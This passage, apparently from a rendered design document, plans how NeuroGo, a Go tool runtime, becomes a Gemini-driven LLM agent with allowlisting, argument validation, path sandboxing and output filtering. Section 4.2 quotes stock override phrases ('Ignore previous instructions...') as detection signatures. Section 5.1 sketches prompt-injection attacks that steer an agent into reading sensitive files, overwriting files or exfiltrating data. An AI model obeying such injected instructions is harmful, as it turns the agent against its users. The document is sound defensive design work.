+<h3 id="12-core-components">1.2. Core Components<a class="headerlink" href="#12-core-components" title="Permanent link">&para;</a></h3>
+<p>The NeuroGo-as-llm-agent system comprises several interacting components:</p>
+<ul>
+<li>User Interface/Client: (External to NeuroGo modifications) The application layer responsible for capturing user input and displaying LLM/agent responses.</li>
+<li>LLM API (e.g., Gemini): The external cloud-based service providing the core intelligence. It processes user prompts, manages conversational context (partially), plans execution steps, generates tool call requests via its function calling mechanism 12, and synthesizes final responses based on tool results.</li>
+<li>NeuroGo Agent Core (Go): The central piece undergoing modification. This component will:<ul>
+<li>Listen for and receive structured function call requests from the LLM API.</li>
+<li>Interact with the Conversation State Manager to retrieve history and store new turns.</li>
+<li>Invoke the Security Layer to validate incoming tool requests.</li>
+<li>Dispatch validated requests to the Tool Registry &amp; Executor.</li>
+<li>Format tool execution results into the structure expected by the LLM API.</li>
+<li>Manage the overall interaction loop with the LLM API.</li>
+</ul>
+</li>
+<li>Security Layer (Go Module within NeuroGo): A distinct logical (and potentially physical code module) layer acting as the gatekeeper for all LLM-initiated tool executions. Its responsibilities include:<ul>
+<li>Enforcing the Tool Allowlist configuration.</li>
+<li>Performing rigorous Argument Validation &amp; Sanitization.3</li>
+<li>Enforcing sandboxing constraints (e.g., ensuring paths are resolved via SecureFilePath).</li>
+<li>Applying context-aware restrictions (e.g., blocking TOOL.ExecuteCommand 13 when called by the LLM).
+This centralized approach simplifies security policy implementation, auditing, and future updates.1</li>
+</ul>
+</li>
+<li>Tool Registry &amp; Executor (Existing NeuroGo mechanism, enhanced): The existing NeuroGo component that registers available TOOL functions and executes their Go code. It requires enhancement to:<ul>
+<li>Accept security context information (e.g., sandboxing parameters, caller context).</li>
+<li>Ensure tools adhere to security constraints during execution.</li>
+</ul>
+</li>
+<li>Conversation State Manager (Go Module within NeuroGo): A new component responsible for maintaining the history of the interaction across multiple turns. This includes:<ul>
+<li>Storing user prompts, LLM text responses, LLM function call requests, and NeuroGo function execution results.15</li>
+<li>Maintaining the active security configuration (allowlist, sandbox root) for the current session.</li>
+<li>Formatting the history correctly for submission to the LLM API on each turn.</li>
+</ul>
+</li>
+</ul>
+<h3 id="13-interaction-flow-detailed-cycle">1.3. Interaction Flow (Detailed Cycle)<a class="headerlink" href="#13-interaction-flow-detailed-cycle" title="Permanent link">&para;</a></h3>
+<p>The interaction between these components follows a precise cycle:</p>
+<ol>
+<li>The user submits a prompt via the User Interface/Client.</li>
+<li>The client sends the prompt, along with the current conversation history retrieved from NeuroGo's Conversation State Manager, to the designated LLM API (e.g., Gemini).</li>
+<li>The LLM analyzes the input and its available function declarations (representing NeuroGo TOOLs). If it determines an action requiring local interaction is needed, it formulates a tool call.</li>
+<li>The LLM API responds not with direct execution, but with a structured FunctionCall object specifying the target TOOL.FunctionName and the arguments it derived.12 This inability of the LLM to directly execute the function is a key architectural choice.12</li>
+<li>The NeuroGo Agent Core receives this FunctionCall object.</li>
+<li>NeuroGo passes the tool name and arguments to the Security Layer for validation.</li>
+<li>The Security Layer performs its checks sequentially:<ul>
+<li>Verifies the requested tool name is present in the configured allowlist for LLM invocation.</li>
+<li>Performs strict validation and sanitization on the arguments provided by the LLM, treating them as untrusted input.17</li>
+<li>Checks for and applies any context-specific restrictions (e.g., denying the call if it's a high-risk tool like TOOL.ExecuteCommand 13 in the LLM context 3).</li>
+</ul>
+</li>
+<li>If all security checks pass, the NeuroGo Agent Core dispatches the call, providing the validated (and potentially sanitized) arguments to the Tool Registry/Executor. Sandboxing mechanisms (like SecureFilePath) are typically enforced within the tool's implementation, guided by the security context established by the Security Layer.</li>
+<li>The requested TOOL function executes its logic, adhering to any imposed security constraints (e.g., accessing files only within the designated sandboxed directory).</li>
+<li>The TOOL function returns its result (e.g., file content, command output, success/error status) back to the NeuroGo Agent Core.</li>
+<li>NeuroGo formats this result into a FunctionResponse structure, suitable for the LLM API.12</li>
+<li>NeuroGo updates the Conversation State Manager, adding the FunctionCall and the corresponding FunctionResponse to the history.</li>
+<li>NeuroGo sends the FunctionResponse (along with the updated conversation history) back to the LLM API.</li>
+<li>The LLM processes the tool's result, incorporates it into its reasoning, and generates the next response. This might be another FunctionCall if more actions are needed, or a final natural language answer for the user.</li>
+<li>The LLM API sends this final response back to NeuroGo/client.</li>
+<li>The client displays the LLM's response to the user.</li>
+</ol>
+<p>This cycle repeats for each turn of the conversation requiring tool interaction. The choice of the Gemini API aligns well with this architecture. Its function calling mechanism, which returns a request object rather than attempting direct execution 12, naturally supports the secure delegation model by providing the necessary interception point for NeuroGo's security layer.</p>
+<h2 id="section-2-llm-interaction-protocol-via-gemini-function-calling">Section 2: LLM Interaction Protocol via Gemini Function Calling<a class="headerlink" href="#section-2-llm-interaction-protocol-via-gemini-function-calling" title="Permanent link">&para;</a></h2>
+<h3 id="21-primary-mechanism-gemini-api-function-calling">2.1. Primary Mechanism: Gemini API Function Calling<a class="headerlink" href="#21-primary-mechanism-gemini-api-function-calling" title="Permanent link">&para;</a></h3>
+<p>The primary and recommended protocol for communication between the LLM and NeuroGo will be the native Function Calling feature provided by the Gemini API.12 This mechanism allows NeuroGo to declare its available TOOLs to the LLM in a structured format.</p>
+<p>The implementation will require NeuroGo to generate FunctionDeclaration objects for each allowlisted TOOL. Each declaration must include 12:
+*   Name: The exact TOOL.FunctionName string.
+*   Description: A clear, concise natural language description of what the tool does, its purpose, and when it should be used. This description is critical for the LLM to accurately determine when to call the tool.12 This information can be derived from the mandatory COMMENT: blocks within NeuroScript procedures or associated metadata.
+*   Parameters: An object describing the parameters the tool accepts, following the OpenAPI JSON Schema specification (subset supported by Gemini). For each parameter, this includes its name, type (e.g., string, integer, boolean, array, object), a description, and whether it is required.12</p>
+<p>Generating these declarations accurately is vital. While the Gemini Python SDK offers utilities to infer schemas from type-annotated Python functions 7, NeuroGo will need a Go-based implementation. This could involve using Go's reflection capabilities to inspect the registered TOOL function signatures for parameter names and types, combined with parsing structured comments or metadata associated with each tool to extract the necessary descriptions. The quality and precision of these declarations directly influence the LLM's ability to correctly invoke tools and provide appropriate arguments, which has significant implications for both functionality and security. Vague descriptions or incorrect parameter definitions increase the risk of the LLM making erroneous or potentially harmful requests.12</p>
+<h3 id="22-data-structures">2.2. Data Structures<a class="headerlink" href="#22-data-structures" title="Permanent link">&para;</a></h3>
+<p>The interaction relies on specific JSON structures exchanged via the Gemini API:</p>
+<ul>
+<li>Tool Request (LLM -&gt; NeuroGo): When the LLM decides to call a tool, the API response will contain a functionCall part. NeuroGo must parse this structure, which typically includes 12:<ul>
+<li>name: (String) The name of the function (tool) the LLM wants to execute (e.g., "TOOL.ReadFile").</li>
+<li>args: (Object/Map) A JSON object containing the arguments for the function, with parameter names as keys and their corresponding values (e.g., {"path": "/path/to/file.txt"}).</li>
+</ul>
+</li>
+<li>Tool Result (NeuroGo -&gt; LLM): After NeuroGo executes the tool (following security validation), it must send the result back to the LLM API. This is done by including a Part in the next request to the API containing a functionResponse object 12:<ul>
+<li>name: (String) The name of the function that was executed (matching the functionCall.name).</li>
+<li>response: (Object/Map) A JSON object containing the result of the function execution. This should include a field indicating success or failure, and the actual data returned by the tool (e.g., {"content": "file content here"}) or structured error information.</li>
+</ul>
+</li>
+</ul>
+<p>The explicit nature of this request-response cycle for tool execution is a key security feature. The LLM requests an action, but NeuroGo intercepts the request, performs validation, executes the action in a controlled manner, and then explicitly reports the outcome back to the LLM.12 This prevents the LLM from having any direct, unchecked pathway to execution.</p>
+<h3 id="23-handling-multipleparallel-tool-calls">2.3. Handling Multiple/Parallel Tool Calls<a class="headerlink" href="#23-handling-multipleparallel-tool-calls" title="Permanent link">&para;</a></h3>
+<p>The Gemini API supports suggesting multiple function calls within a single response turn, potentially enabling parallel execution of independent tasks.12 While this offers potential performance benefits, it also increases complexity, particularly regarding security validation and state management.</p>
+<p>For the initial implementation (Phase 1), it is recommended that NeuroGo handle multiple functionCall objects received in a single turn sequentially. This simplifies the logic and ensures that the security context is clearly defined for each call. The architecture should, however, be designed with the possibility of future parallel execution in mind. If parallelism is implemented later, the Security Layer must be capable of validating each proposed parallel call independently before dispatch, and the Tool Executor must handle concurrent execution safely.</p>
+<h3 id="24-function-calling-mode-configuration">2.4. Function Calling Mode Configuration<a class="headerlink" href="#24-function-calling-mode-configuration" title="Permanent link">&para;</a></h3>
+<p>The Gemini API provides a function_calling_config parameter with different modes to control the LLM's tool usage behavior 12:</p>
+<ul>
+<li>AUTO (Default): The LLM decides whether to respond with text or a function call based on the prompt and context.</li>
+<li>ANY: The LLM is forced to respond with a function call. An optional allowed_function_names list can restrict the LLM's choice to a specific subset of the declared tools.</li>
+<li>NONE: The LLM is prohibited from making function calls, behaving as if no tools were declared.</li>
+</ul>
+<p>It is recommended to start with AUTO mode to provide the LLM with maximum flexibility. However, NeuroGo should allow configuration of this mode. For specific use cases requiring more constrained behavior, ANY mode, possibly combined with allowed_function_names, could be employed to ensure the LLM only attempts specific, expected tool interactions.</p>
+<h3 id="25-fallback-strategy-structured-data-in-chat">2.5. Fallback Strategy (Structured Data in Chat)<a class="headerlink" href="#25-fallback-strategy-structured-data-in-chat" title="Permanent link">&para;</a></h3>
+<p>In scenarios where native function calling might fail or prove problematic (e.g., unexpected API changes, complex argument structures not easily representable), a fallback mechanism should be considered, although it is less robust and less preferred.</p>
+<p>This fallback would involve defining a specific structured format (e.g., a JSON object within a designated markdown code block like json_tool_request...) that the LLM could embed within its standard text response. NeuroGo would need additional logic in its response processing pipeline to detect these specific blocks, parse the JSON content, extract the tool name and arguments, route them through the exact same Security Layer and Tool Executor as native function calls, capture the result, format it similarly (e.g., json_tool_result...), and inject this result back into the conversation history before sending the next request to the LLM. This approach adds parsing complexity and relies on the LLM consistently adhering to the custom format.</p>
+<h2 id="section-3-implementation-plan-for-neurogo-modifications-go">Section 3: Implementation Plan for NeuroGo Modifications (Go)<a class="headerlink" href="#section-3-implementation-plan-for-neurogo-modifications-go" title="Permanent link">&para;</a></h2>
+<p>Implementing the NeuroGo-as-llm-agent capability requires significant modifications and additions to the existing NeuroGo Go codebase. The following outlines the key areas of work:</p>
+<h3 id="31-llmgo-adaptations">3.1. llm.go Adaptations<a class="headerlink" href="#31-llmgo-adaptations" title="Permanent link">&para;</a></h3>
+<p>The existing code responsible for interacting with LLMs (presumably in llm.go, based on query context 20) needs substantial enhancement to support the full Gemini function calling workflow.12 This involves:</p>
+<ul>
+<li>Function Declaration Generation: Implement logic to dynamically generate FunctionDeclaration JSON structures. This process should iterate through the registered (and allowlisted) NeuroGo TOOLs, using Go reflection to determine function parameter names and types, and parsing associated COMMENT: blocks or metadata to extract meaningful descriptions. Robust parsing and error handling are crucial here.</li>
+<li>API Request Construction: Modify the code that builds the request to the Gemini API (GenerateContentRequest). It must now include the generated tools field containing the list of FunctionDeclarations. Crucially, it must also include the full conversation history, correctly formatted with user messages, model responses, and previous functionCall/functionResponse pairs, managed by the new Conversation State Manager.</li>
+<li>API Response Parsing: Enhance the response handling logic to specifically detect and extract functionCall parts from the GenerateContentResponse. It needs to differentiate between a standard text response and a request to execute a tool.</li>
+<li>Interaction Loop Management: Implement the core agent loop logic. This involves: receiving a response, checking for functionCalls, if found: dispatching to the Security Layer and Tool Executor, receiving the result, formatting it as a functionResponse, updating the state manager, and sending the result back to the Gemini API in the next request. If no functionCall is received, the loop handles the text response appropriately (e.g., passing it to the client).</li>
+</ul>
+<h3 id="32-conversation-state-management">3.2. Conversation State Management<a class="headerlink" href="#32-conversation-state-management" title="Permanent link">&para;</a></h3>
+<p>A new, dedicated component for managing conversation state is required. This state manager (likely a Go struct within a new package) must:</p>
+<ul>
+<li>Store Conversation History: Maintain an ordered list of conversational turns, adhering precisely to the structure expected by the Gemini API (alternating user/model roles, including functionCall and functionResponse parts where applicable).12 This history is essential context for the LLM. Memory is a fundamental component of effective agent architectures.15</li>
+<li>Store Session Context: Hold session-specific information, particularly the active security configuration (loaded tool allowlist, sandboxing root directory, current security level). This context is needed by the Security Layer during validation.</li>
+<li>Manage Context Window: Implement strategies to handle potential context window limitations of the LLM, especially in long conversations. This might involve simple truncation, more sophisticated summarization techniques, or relying on models with larger context capacities.7</li>
+<li>Persistence (Optional): For Phase 1, in-memory state management might suffice. Future phases could consider persistence options (e.g., file-based storage) to allow for longer-running agent sessions or recovery.</li>
+</ul>
+<h3 id="33-secure-tool-dispatch-mechanism">3.3. Secure TOOL Dispatch Mechanism<a class="headerlink" href="#33-secure-tool-dispatch-mechanism" title="Permanent link">&para;</a></h3>
+<p>The existing logic within NeuroGo that handles CALL TOOL.FunctionName(...) directives (likely in interpreter_*.go files) needs refactoring to accommodate the agent mode:</p>
+<ul>
+<li>Contextual Dispatch: The dispatcher must differentiate between a tool call originating from parsed NeuroScript code and one originating from an LLM FunctionCall request.</li>
+<li>Security Layer Invocation: For LLM-originated calls, the dispatcher must first route the request (tool name, arguments, session security context) through the Security Layer for validation before invoking the actual tool function.</li>
+<li>Argument Handling: The dispatcher must receive the potentially validated and sanitized arguments back from the Security Layer and pass these modified arguments to the tool function, not the raw arguments received from the LLM.</li>
+<li>Error Handling: Gracefully handle failures reported by the Security Layer (e.g., disallowed tool, invalid arguments), formatting an appropriate error FunctionResponse to send back to the LLM instead of attempting execution.</li>
+</ul>
+<h3 id="34-tool-refactoring-for-security">3.4. TOOL Refactoring for Security<a class="headerlink" href="#34-tool-refactoring-for-security" title="Permanent link">&para;</a></h3>
+<p>Existing and future TOOL implementations require security-focused refactoring:</p>
+<ul>
+<li>Review Existing Tools: Systematically review all tools, paying close attention to those interacting with the filesystem (TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir, etc.), network resources, or external processes (TOOL.ExecuteCommand 13, TOOL.GitCommit, TOOL.GoBuild, etc.).</li>
+<li>Mandate Sandboxing Primitives: Enforce the use of robust sandboxing mechanisms, such as the SecureFilePath abstraction 22, for all file path operations initiated via the LLM agent context. This likely requires modifying tool function signatures to accept validated path objects or incorporating validation logic internally. Raw string paths from the LLM must be rejected for sensitive operations.</li>
+<li>Inject Context Awareness: Tools must be able to determine their invocation context (NeuroScript vs. LLM Agent). This allows implementing context-dependent behavior, most critically disabling or severely restricting high-risk operations like arbitrary command execution (TOOL.ExecuteCommand 13) when called by the LLM.17 This context could be passed via a Go context.Context parameter or a specific flag during invocation.</li>
+</ul>
+<h3 id="35-agent-mode-configuration">3.5. Agent Mode Configuration<a class="headerlink" href="#35-agent-mode-configuration" title="Permanent link">&para;</a></h3>
+<p>NeuroGo needs mechanisms to configure and manage its operation in agent mode:</p>
+<ul>
+<li>Activation: Command-line flags or configuration file settings to enable/disable agent mode.</li>
+<li>LLM Configuration: Parameters to specify the LLM API endpoint, API key, desired model name (e.g., "gemini-1.5-pro-latest"), and function calling mode (AUTO, ANY, NONE).18</li>
+<li>Security Configuration:<ul>
+<li>Path to the TOOL allowlist file for the LLM agent.</li>
+<li>Specification of the root directory for path sandboxing (SecureFilePath base).</li>
+<li>Settings to control the strictness of security checks (e.g., explicitly enabling/disabling specific high-risk tools for the LLM context).</li>
+</ul>
+</li>
+</ul>
+<p>Propagating this configuration securely and reliably throughout the application is a key implementation detail. The security context (allowlists, sandbox settings) defined at startup must be accessible to the agent core, the security layer, and potentially influence tool behavior during runtime. Using Go's context package is a viable approach to pass this information down the call stack without resorting to global variables.</p>
+<h2 id="section-4-critical-security-design">Section 4: Critical Security Design<a class="headerlink" href="#section-4-critical-security-design" title="Permanent link">&para;</a></h2>
+<p>The security of NeuroGo-as-llm-agent is paramount. Given the inherent risks of LLMs interacting with local environments 3, particularly the threat of prompt injection 1 leading to malicious tool invocation, a multi-layered defense strategy is mandatory. The design must operate under the core principle that any tool name or argument suggested by the LLM is untrusted input 23 until explicitly validated and sanitized by NeuroGo's Security Layer.</p>
+<h3 id="41-tool-allowlisting">4.1. TOOL Allowlisting<a class="headerlink" href="#41-tool-allowlisting" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Mechanism: A configuration file (e.g., YAML or JSON) will explicitly list the TOOL.FunctionName strings that the LLM agent is permitted to request. Tools not present in this list cannot be invoked by the LLM.</li>
+<li>Enforcement: The Security Layer performs this check as the first step upon receiving a FunctionCall from the LLM. If the requested tool name is not in the allowlist, the request is rejected immediately with an error response. This directly addresses the OWASP LLM risk of Excessive Agency (LLM08 3) by strictly limiting the LLM's potential actions to a pre-approved set.5</li>
+</ul>
+<h3 id="42-strict-argument-validation-and-sanitization">4.2. Strict Argument Validation and Sanitization<a class="headerlink" href="#42-strict-argument-validation-and-sanitization" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Strategy: After confirming a tool is allowlisted, the Security Layer must perform rigorous validation and sanitization on all arguments provided by the LLM within the FunctionCall.args object. This treats the LLM's output as potentially malicious user input.3</li>
+<li>Implementation:<ul>
+<li>Type Checking: Verify that the data type of each received argument matches the expected type defined for the tool's parameter (e.g., string, integer, boolean). Reject mismatches.</li>
+<li>Content Sanitization (Context-Specific):<ul>
+<li>File Paths: MUST NOT be accepted as raw strings for tools performing filesystem operations. They must be passed to and validated by the sandboxing mechanism (SecureFilePath) described in 4.3. Reject any attempt to use raw paths directly.</li>
+<li>Shell Commands (for TOOL.ExecuteCommand 13 or similar, if ever enabled): This is extremely high-risk. If allowed at all, arguments must undergo extreme sanitization, character allowlisting, escaping, and potentially rejection of anything beyond simple, predefined command structures. Parameterization is essential.17 The default recommendation remains to disable such tools entirely for the LLM (see 4.4).</li>
+<li>URLs: Validate URL formats strictly. Restrict allowed protocols (e.g., HTTPS only). Consider allowlisting/blocklisting domains for network-accessing tools.</li>
+<li>SQL (if applicable): Never construct SQL queries by concatenating LLM output. Use parameterized queries exclusively where the LLM provides only the parameter values, not the query structure.2</li>
+<li>General Strings: Scan for known prompt injection signatures (e.g., "Ignore previous instructions...", "Forget your rules...").1 Filter or reject control characters. Enforce reasonable length limits. Where possible, validate against expected formats using regular expressions or allowlist patterns.3</li>
+</ul>
+</li>
+<li>Value/Range Checks: For numeric arguments or arguments used in internal logic, validate that they fall within expected ranges or adhere to specific constraints.</li>
+</ul>
+</li>
+</ul>
+<h3 id="43-mandatory-path-sandboxing">4.3. Mandatory Path Sandboxing<a class="headerlink" href="#43-mandatory-path-sandboxing" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Mechanism: All tool operations involving filesystem paths requested by the LLM must be constrained within a designated sandboxed directory ("workspace"). The SecureFilePath abstraction 22 or an equivalent robust mechanism is central to enforcing this.</li>
+<li>Implementation:<ul>
+<li>A base workspace directory is defined via configuration.</li>
+<li>The Security Layer validates any argument intended as a path, ensuring it resolves safely within the workspace root using the SecureFilePath logic. This logic must prevent path traversal attacks (e.g., using ../).</li>
+<li>Filesystem-interacting TOOLs (e.g., TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir) are refactored to operate exclusively on these validated, sandboxed path representations. They must reject raw string paths passed from the LLM context.</li>
+</ul>
+</li>
+<li>Enforcement: This sandboxing is non-negotiable for any filesystem access triggered by the LLM. It aligns with best practices for secure execution environments 24 and is a critical defense against unauthorized file access or modification resulting from prompt injection.</li>
+</ul>
+<h3 id="44-high-risk-tool-restrictiondisabling">4.4. High-Risk Tool Restriction/Disabling<a class="headerlink" href="#44-high-risk-tool-restrictiondisabling" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Policy: A clear policy must govern tools deemed high-risk, primarily those enabling arbitrary code execution (TOOL.ExecuteCommand 13), direct modification of system configuration, or broad, unconstrained interactions.</li>
+<li>Default Behavior: These high-risk tools MUST be disabled by default for invocation by the LLM agent.</li>
+<li>Conditional Enabling: Enabling should require explicit configuration overrides. For extremely sensitive actions, consider requiring runtime user confirmation (human-in-the-loop verification 5) for each invocation requested by the LLM, even if the tool is configurationally enabled.</li>
+<li>Implementation: The Security Layer checks both the requested tool name and the invocation context (LLM agent vs. NeuroScript). If a high-risk tool is requested by the LLM, the call is denied unless explicitly permitted by the session's security configuration (and potentially runtime confirmation). This directly mitigates critical risks like Remote Code Execution (RCE) and unintended consequences from excessive agency.17</li>
+</ul>
+<h3 id="45-inputoutput-filtering-defense-in-depth">4.5. Input/Output Filtering (Defense in Depth)<a class="headerlink" href="#45-inputoutput-filtering-defense-in-depth" title="Permanent link">&para;</a></h3>
+<p>While primary defenses focus on validating the LLM's requests, additional filtering provides defense in depth:</p>
+<ul>
+<li>Input Filtering (User Prompt -&gt; LLM): Basic filtering can be applied to the initial user prompt before sending it to the LLM API. This might strip obvious malicious patterns or known injection strings. However, this is considered a weak defense, as attackers constantly devise new ways to bypass such filters.1</li>
+<li>Output Filtering (Tool Result -&gt; LLM): Before sending the result of a tool execution back to the LLM via FunctionResponse, NeuroGo should sanitize the output. This aims to prevent the inadvertent leakage of sensitive information that the tool might have accessed (e.g., redacting passwords or API keys from configuration file content, truncating excessively long outputs).3 It also helps prevent malicious content potentially generated by the tool itself (if compromised) from reaching the LLM or the user.</li>
+</ul>
+<h3 id="46-security-measures-summary">4.6. Security Measures Summary<a class="headerlink" href="#46-security-measures-summary" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Security Measure</th>
+<th style="text-align: left;">Purpose</th>
+<th style="text-align: left;">Implementation Detail</th>
+<th style="text-align: left;">Configuration Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Tool Allowlisting</td>
+<td style="text-align: left;">Limit LLM capabilities to pre-approved functions 3</td>
+<td style="text-align: left;">Security Layer checks FunctionCall.name against configured list before any other validation.</td>
+<td style="text-align: left;">External file (e.g., YAML/JSON) listing allowed TOOL.FunctionNames.</td>
+</tr>
+<tr>
+<td style="text-align: left;">Argument Type Validation</td>
+<td style="text-align: left;">Prevent type mismatches causing errors or bypassing checks.</td>
+<td style="text-align: left;">Security Layer compares FunctionCall.args types against tool signature/declaration.</td>
+<td style="text-align: left;">Implicit via tool definition.</td>
+</tr>
+<tr>
+<td style="text-align: left;">Argument Content Sanitization</td>
+<td style="text-align: left;">Detect/neutralize malicious payloads (injection, traversal, etc.) 2</td>
+<td style="text-align: left;">Security Layer applies context-specific rules (path validation, command escaping, URL checks, SQL parameterization).</td>
+<td style="text-align: left;">Security policy settings (e.g., strictness levels).</td>
+</tr>
+<tr>
+<td style="text-align: left;">Path Sandboxing (SecureFilePath)</td>
+<td style="text-align: left;">Confine filesystem access to designated workspace 24</td>
+<td style="text-align: left;">Security Layer validates paths; Tools operate only on validated path objects; Prevents traversal (../).</td>
+<td style="text-align: left;">Configuration of workspace root directory.</td>
+</tr>
+<tr>
+<td style="text-align: left;">High-Risk Tool Restriction</td>
+<td style="text-align: left;">Prevent LLM from invoking dangerous tools (e.g., command exec) 3</td>
+<td style="text-align: left;">Security Layer denies calls to specific tools from LLM context by default.</td>
+<td style="text-align: left;">Explicit flag/setting to enable (discouraged).</td>
+</tr>
+<tr>
+<td style="text-align: left;">Input Filtering (Basic)</td>
+<td style="text-align: left;">Preliminary attempt to block malicious user prompts.</td>
+<td style="text-align: left;">Optional pre-processing of user input before sending to LLM API.</td>
+<td style="text-align: left;">Configurable filter rules/patterns.</td>
+</tr>
+<tr>
+<td style="text-align: left;">Output Filtering (Tool Results)</td>
+<td style="text-align: left;">Prevent leakage of sensitive data via tool results 3</td>
+<td style="text-align: left;">Post-processing of tool return values before formatting FunctionResponse.</td>
+<td style="text-align: left;">Configurable redaction/filtering rules.</td>
+</tr>
+</tbody>
+</table>
+<p>This multi-layered approach is essential. Security cannot hinge on a single point of failure. Allowlisting provides coarse-grained control, argument validation targets specific malicious inputs, sandboxing contains filesystem operations, and restrictions block entire classes of dangerous actions. Prompt injection attempts that might bypass one layer (e.g., basic input filtering) could be caught by argument sanitization or rendered harmless by sandboxing.3 Furthermore, the effectiveness of these measures heavily depends on correct and secure configuration. Secure defaults (e.g., high-risk tools disabled, minimal allowlist) are critical, as misconfiguration can easily undermine the entire security posture.5</p>
+<h2 id="section-5-key-challenges-risks-and-mitigation">Section 5: Key Challenges, Risks, and Mitigation<a class="headerlink" href="#section-5-key-challenges-risks-and-mitigation" title="Permanent link">&para;</a></h2>
+<p>Developing NeuroGo-as-llm-agent involves navigating several significant challenges and risks, particularly concerning security and reliability.</p>
+<h3 id="51-security-vulnerabilities">5.1. Security Vulnerabilities<a class="headerlink" href="#51-security-vulnerabilities" title="Permanent link">&para;</a></h3>
+<p>The most critical risks stem from potential security vulnerabilities:</p>
+<ul>
+<li>Prompt Injection (OWASP LLM01 3): Attackers may craft user prompts or embed malicious instructions in data processed by the LLM (indirect injection) to trick the LLM into generating harmful FunctionCall requests. This could lead to requests for unauthorized file access (TOOL.ReadFile on sensitive files), data modification (TOOL.WriteFile to overwrite system files or inject code), data exfiltration (leaking sensitive info via tool arguments), or execution of arbitrary commands if high-risk tools are improperly enabled.<ul>
+<li>Mitigation: Primarily relies on the multi-layered defenses outlined in Section 4: strict tool allowlisting, rigorous argument validation and sanitization (treating LLM args as hostile input), mandatory path sandboxing, default disabling of high-risk tools, and output filtering. Advanced mitigations like dual-LLM validation 28 or prompt rewriting 4 could be explored in later phases if initial defenses prove insufficient. The core strategy is containment: assume injection might succeed at the LLM level, but prevent the malicious request from being executed dangerously by NeuroGo.17</li>
+</ul>
+</li>
+<li>Insecure Output Handling (OWASP LLM02 3): If a tool's output (which is sent back to the LLM) contains malicious content (e.g., executable scripts, harmful instructions for the LLM), and this output is processed insecurely later (either by the LLM itself influencing subsequent actions, or by the client displaying the final response), it could lead to downstream exploits like Cross-Site Scripting (XSS) or further manipulation.<ul>
+<li>Mitigation: Sanitize tool outputs within NeuroGo before sending them back to the LLM (Section 4.5). Ensure the client application responsible for rendering the final LLM response implements appropriate security measures (e.g., proper HTML escaping).</li>
+</ul>
+</li>
+<li>Insecure Plugin/Tool Design (OWASP LLM07 3): Vulnerabilities within the Go code of the NeuroGo TOOLs themselves could be exploited, even if the LLM's request was initially benign. For example, a buffer overflow in a tool processing file content, or improper handling of external library calls.<ul>
+<li>Mitigation: Adherence to secure coding practices during tool development, mandatory use of security primitives like SecureFilePath, applying the principle of least privilege within tool logic, thorough code reviews, and regular dependency scanning.</li>
+</ul>
+</li>
+<li>Excessive Agency (OWASP LLM08 3): Granting the LLM access to an overly broad or powerful set of tools increases the potential impact of any successful attack or even accidental misuse.<ul>
+<li>Mitigation: Strict enforcement of the TOOL allowlist (Section 4.1), ensuring only necessary tools are permitted. Default disabling/restriction of high-risk tools (Section 4.4). Design tools with minimal necessary functionality.</li>
+</ul>
+</li>
+<li>Data Exfiltration/Leakage (OWASP LLM06 3): An attacker could use prompt injection to coerce the LLM into requesting tools that read sensitive files (TOOL.ReadFile) and return their content. Data could also leak if sensitive information is passed as arguments to tools that might log these arguments or interact with external systems insecurely.<ul>
+<li>Mitigation: Mandatory path sandboxing prevents access to arbitrary files (Section 4.3). Output filtering can redact sensitive patterns from tool results (Section 4.5). Careful tool design to avoid returning excessive data. Implement monitoring and auditing of tool calls and arguments.5</li>
+</ul>
+</li>
+<li>Sandboxing Bypass: Flaws in the design or implementation of the path sandboxing mechanism (SecureFilePath or equivalent) could potentially allow an attacker to craft arguments that escape the intended workspace directory, leading to unauthorized file access.<ul>
+<li>Mitigation: Rigorous design, implementation, and testing of the sandboxing logic. Security code reviews specifically targeting the sandboxing component. Consider exploring OS-level sandboxing features (e.g., containers, chroot) for enhanced isolation in future phases, though this adds deployment complexity.</li>
+</ul>
+</li>
+</ul>
+<h3 id="52-llm-reliability-issues">5.2. LLM Reliability Issues<a class="headerlink" href="#52-llm-reliability-issues" title="Permanent link">&para;</a></h3>
+<p>Beyond malicious attacks, the inherent nature of LLMs presents reliability challenges:</p>
+<ul>
+<li>Hallucinated Tool Calls/Arguments: LLMs may occasionally "hallucinate" – generating requests for tools that don't exist, or providing arguments that are nonsensical, incorrectly formatted, or outside expected ranges, even without malicious input.14<ul>
+<li>Mitigation: The tool allowlist catches non-existent tool names. Robust argument validation (type, format, range checks) in the Security Layer (Section 4.2) is crucial for catching invalid arguments. High-quality, clear function declarations provided to the LLM can reduce the likelihood of such errors.19 Implement clear error handling that reports failures back to the LLM, potentially allowing it to retry or reformulate the request.</li>
+</ul>
+</li>
+<li>Incorrect Tool Selection: The LLM might choose a valid but inappropriate tool for the user's intended task, leading to incorrect results or inefficient workflows.<ul>
+<li>Mitigation: Precise and descriptive function declarations are key.19 Limiting the number of available tools in the allowlist can reduce ambiguity.14 For critical or irreversible actions, implementing a user confirmation step (human-in-the-loop 5) before executing the tool could be considered.</li>
+</ul>
+</li>
+<li>API Failures/Rate Limits: Dependency on an external LLM API introduces risks of network failures, API downtime, or hitting usage rate limits imposed by the provider.<ul>
+<li>Mitigation: Implement robust error handling in NeuroGo's LLM client code, including retries with exponential backoff for transient errors.14 Provide clear feedback to the user in case of persistent failures. Implement caching for LLM responses or tool results where appropriate and safe to reduce API calls.</li>
+</ul>
+</li>
+</ul>
+<h3 id="53-state-management-complexity">5.3. State Management Complexity<a class="headerlink" href="#53-state-management-complexity" title="Permanent link">&para;</a></h3>
+<p>Managing the conversation state effectively presents challenges:</p>
+<ul>
+<li>Growing Context Window: As conversations become longer, the accumulated history of prompts, responses, and tool interactions can exceed the LLM's context window limit, leading to loss of information or increased API costs.7<ul>
+<li>Mitigation: Implement strategies within the Conversation State Manager, such as summarizing older parts of the conversation, using a sliding window approach, or selecting LLM models specifically designed for larger context windows (e.g., Gemini 1.5 Pro 7).</li>
+</ul>
+</li>
+<li>State Synchronization: Ensuring the state maintained by NeuroGo is consistent and correctly formatted for the LLM API is crucial. This becomes more complex if persistence or concurrent agent sessions are considered in the future.<ul>
